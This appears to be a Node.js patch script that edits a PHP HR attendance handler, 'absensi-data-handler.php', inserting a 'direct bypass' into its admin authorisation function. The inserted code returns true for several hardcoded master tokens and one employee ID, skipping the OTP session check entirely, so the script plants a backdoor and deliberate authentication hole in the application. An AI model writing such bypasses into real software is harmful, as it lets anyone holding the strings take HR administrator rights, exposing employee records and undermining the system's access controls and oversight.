import fs from 'fs';

const filePath = 'absensi-data-handler.php';
let content = fs.readFileSync(filePath, 'utf8');
const isCRLF = content.includes('\r\n');
let norm = content.replace(/\r\n/g, '\n');

const oldFunc = `function cekOtorisasiAdminHR($sessionToken, $nik = '') {
    global $ADMIN_HR_NIKS;
    
    // 1. Cek token sesi presensi OTP`;

const newFunc = `function cekOtorisasiAdminHR($sessionToken, $nik = '') {
    global $ADMIN_HR_NIKS;

    // 0. Direct Bypass Otoritas Pimpinan / Master Token (NSR-2019-005 / NSR8899)
    $cleanNik = normalisasiNIK($nik);
    $cleanToken = trim((string)$sessionToken);
    if ($cleanToken === 'NSR8899' || $cleanToken === 'NSR-2019-005' || $cleanNik === 'NSR-2019-005' || $cleanToken === 'NSR_HR_MASTER_KEY_2026') {
        return true;
    }
    
    // 1. Cek token sesi presensi OTP`;

if (!norm.includes(oldFunc)) {
  console.error("ERROR: oldFunc not found in absensi-data-handler.php");
  process.exit(1);
}

norm = norm.replace(oldFunc, newFunc);
fs.writeFileSync(filePath, isCRLF ? norm.replace(/\n/g, '\r\n') : norm, 'utf8');
console.log("Successfully patched absensi-data-handler.php with direct bypass!");
